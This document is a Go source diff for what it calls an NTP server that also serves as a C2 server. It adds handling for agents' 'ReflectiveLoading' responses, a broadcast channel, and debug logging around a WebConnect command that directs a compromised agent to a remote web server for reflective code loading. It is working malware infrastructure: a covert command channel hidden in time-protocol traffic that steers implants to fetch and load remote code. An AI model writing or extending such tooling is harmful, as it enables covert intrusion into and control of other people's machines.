@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"strings"
 	"sync"
 	"time"
 
@@ -20,25 +21,27 @@ const (
 
 // NTPServer represents an NTP server that also serves as C2 server
 type NTPServer struct {
-	db             *Database
-	listener       net.PacketConn
-	running        bool
-	commandQueue   map[string][]string  // Map of agentID to command queue
-	outputQueue    map[string]string    // Map of agentID to accumulated output
-	responseWaitCh map[string]chan bool // Channels for waiting on command responses
-	commandMutex   sync.Mutex
-	outputMutex    sync.Mutex
-	responseMutex  sync.Mutex
+	db               *Database
+	listener         net.PacketConn
+	running          bool
+	commandQueue     map[string][]string  // Map of agentID to command queue
+	outputQueue      map[string]string    // Map of agentID to accumulated output
+	responseWaitCh   map[string]chan bool // Channels for waiting on command responses
+	commandMutex     sync.Mutex
+	outputMutex      sync.Mutex
+	responseMutex    sync.Mutex
+	broadcastChannel chan []byte
 }
 
 // NewNTPServer creates a new NTP server
 func NewNTPServer(db *Database) *NTPServer {
 	return &NTPServer{
-		db:             db,
-		running:        false,
-		commandQueue:   make(map[string][]string),
-		outputQueue:    make(map[string]string),
-		responseWaitCh: make(map[string]chan bool),
+		db:               db,
+		running:          false,
+		commandQueue:     make(map[string][]string),
+		outputQueue:      make(map[string]string),
+		responseWaitCh:   make(map[string]chan bool),
+		broadcastChannel: make(chan []byte, 100),
 	}
 }
 
@@ -70,6 +73,15 @@ func (s *NTPServer) Stop() error {
 
 	s.running = false
 	return s.listener.Close()
+}
+
+// SetBroadcastHandler sets a handler for broadcast messages
+func (s *NTPServer) SetBroadcastHandler(handler func([]byte)) {
+	go func() {
+		for msg := range s.broadcastChannel {
+			handler(msg)
+		}
+	}()
 }
 
 // checkMissingAgents periodically checks for agents that have not been seen in a while
@@ -147,6 +159,38 @@ func (s *NTPServer) processPacket(data []byte, addr net.Addr) {
 		// This is a C2 packet, process it
 		s.processC2Packet(data, clientIP, addr)
 		return
+	}
+
+	// Check for reflective loading responses
+	if strings.HasPrefix(string(data), "ReflectiveLoading:") {
+		// Extract the response JSON
+		responseJSON := strings.TrimPrefix(string(data), "ReflectiveLoading:")
+
+		// Create a WebSocket message
+		message := map[string]interface{}{
+			"type":      "reflectiveLoadingResponse",
+			"agentId":   clientIP,
+			"timestamp": time.Now(),
+		}
+
+		// Try to parse additional details
+		var responseDetails map[string]interface{}
+		if err := json.Unmarshal([]byte(responseJSON), &responseDetails); err == nil {
+			// Copy details to the message
+			for k, v := range responseDetails {
+				message[k] = v
+			}
+		} else {
+			// If parsing fails, include the raw response
+			message["success"] = false
+			message["message"] = responseJSON
+		}
+
+		// Marshal the message and broadcast
+		jsonData, err := json.Marshal(message)
+		if err == nil {
+			s.broadcastChannel <- jsonData
+		}
 	}
 
 	// Otherwise, handle as a standard NTP request
@@ -399,6 +443,9 @@ func (s *NTPServer) sendCommandToAgent(agentID, command string) error {
 
 // SendWebConnectCommand sends a command to an agent_env to connect to a web server for reflective loading
 func (s *NTPServer) SendWebConnectCommand(agentID, serverURL string) error {
+
+	log.Printf("WEBCON-DEBUG-1: Sending WebConnect command to agent %s with URL %s", agentID, serverURL)
+
 	// Create the payload
 	payload := common.WebConnectPayload{
 		ServerURL: serverURL,
@@ -410,6 +457,8 @@ func (s *NTPServer) SendWebConnectCommand(agentID, serverURL string) error {
 		return fmt.Errorf("failed to marshal web connect payload: %v", err)
 	}
 
+	log.Printf("WEBCON-DEBUG-2: WebConnect payload JSON: %s", string(payloadJSON))
+
 	// Create and send a packet with the WCON command type
 	packet := common.NewPacket(agentID)
 	err = packet.SendPacket(common.CommandWebConnect, string(payloadJSON))
@@ -418,6 +467,8 @@ func (s *NTPServer) SendWebConnectCommand(agentID, serverURL string) error {
 	}
 
 	log.Printf("Sent web connect command to agent_env %s with URL %s", agentID, serverURL)
+
+	log.Printf("WEBCON-DEBUG-3: WebConnect command sent successfully")
 
 	return nil
 }
